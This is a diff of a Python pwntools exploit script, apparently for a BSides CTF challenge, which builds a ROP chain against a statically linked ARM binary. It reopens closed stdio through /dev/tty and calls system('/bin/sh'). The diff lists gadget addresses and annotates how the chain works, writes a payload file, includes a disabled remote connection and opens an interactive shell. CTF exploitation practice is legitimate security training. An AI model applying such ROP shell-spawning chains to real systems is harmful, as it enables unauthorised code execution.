@@ -2,7 +2,7 @@
 from pwn import *
 import os
 
-context.binary = "./main"
+context.binary = "./main_fixed"
 
 # rops
 rop_r1_t_adr = 0x0004407c  # ; pop {r1, pc} !thumb
@@ -22,10 +22,6 @@ rop_set_r0_t_adr = 0x00014d88 # ; pop {r0, r6, pc}
 
 location_bin_sh = 0x0004a3b4  # string "/bin/sh"
 location_date = 0x0004a2e0  # string "date +'%s'"
-
-elf = ELF(context.binary.path)
-rop = ROP(elf)
-#rop.call("open", [b"/dev/tty"])
 
 """
 What I want to have
@@ -48,6 +44,17 @@ Okay. Helpful:
 non thumb:
   0x0003df1c : pop {r4, r6, r7, fp, ip, lr, pc}
     - doesn't pop r8, but sets lr and pc
+
+
+What happens in the binary:
+  - binary is fully statically linked and included libc functions have stack canaries
+  - using the `system` function, binaries like date can be called
+  - string `/bin/sh` is already provided at location $location_bin_sh
+  - issue is:
+    - before we can intervene stdout, stdin and stderr are closed (file pointers 0, 1 and 2)
+    - we can recover those by calling into open with e.g. /dev/tty
+
+How the rop chain works:
 
 """
 
@@ -142,7 +149,7 @@ with open("/local-tmp/payload", "bw") as fp:
     fp.write(payload + b"\n")
     fp.write(b"ls")
 
-exit()
+# exit()
 
 if False:
     r = remote("34.125.56.151", 2222, ssl=False)
@@ -155,9 +162,10 @@ source /home/elizabeth/Documents/Projects/ccc/ctfriday-bsidesindore23/pwndbg/gdb
 # b vuln
 b *0x00026c2c
 b *0x0004407c
-b *0x111fc
 # b *0x000104da
+b *0x010488
 c
 """)
+#io = process(context.binary.path)
 io.sendline(payload)
 io.interactive()
